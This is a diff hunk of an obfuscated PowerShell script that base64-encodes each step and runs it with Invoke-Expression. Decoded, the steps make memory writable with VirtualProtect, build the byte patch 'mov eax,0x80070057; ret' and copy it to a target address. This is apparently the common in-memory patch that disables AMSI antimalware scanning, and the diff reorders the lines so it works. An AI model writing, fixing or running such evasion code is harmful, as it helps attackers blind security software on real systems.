@@ -16,12 +16,9 @@ Invoke-Expression $j
 $k="W1dpbjMyXTo6VmlydHVhbFByb3RlY3QoJEFkZHJlc3MsIFt1aW50MzJdNSwgMHg0MCwgW3JlZl0kcCk="
 $l=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($k))
 Invoke-Expression $l
-$m="W1dpbjMyXTo6VmlydHVhbFByb3RlY3QoJEFkZHJlc3MsIFt1aW50MzJdNSwgMHg0MCwgW3JlZl0kcCk="
+$m="JFBhdGNoID0gW0J5dGVbXV0gKDB4QjgsIDB4NTcsIDB4MDAsIDB4MDcsIDB4ODAsIDB4QzMp"
 $n=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($m))
 Invoke-Expression $n
-$o="JFBhdGNoID0gW0J5dGVbXV0gKDB4QjgsIDB4NTcsIDB4MDAsIDB4MDcsIDB4ODAsIDB4QzMp"
+$o="W1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6Q29weSgkUGF0Y2gsIDAsICRBZGRyZXNzLCA2KQ=="
 $p=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($o))
 Invoke-Expression $p
-$q="W1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6Q29weSgkUGF0Y2gsIDAsICRBZGRyZXNzLCA2KQ=="
-$r=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($q))
-Invoke-Expression $r
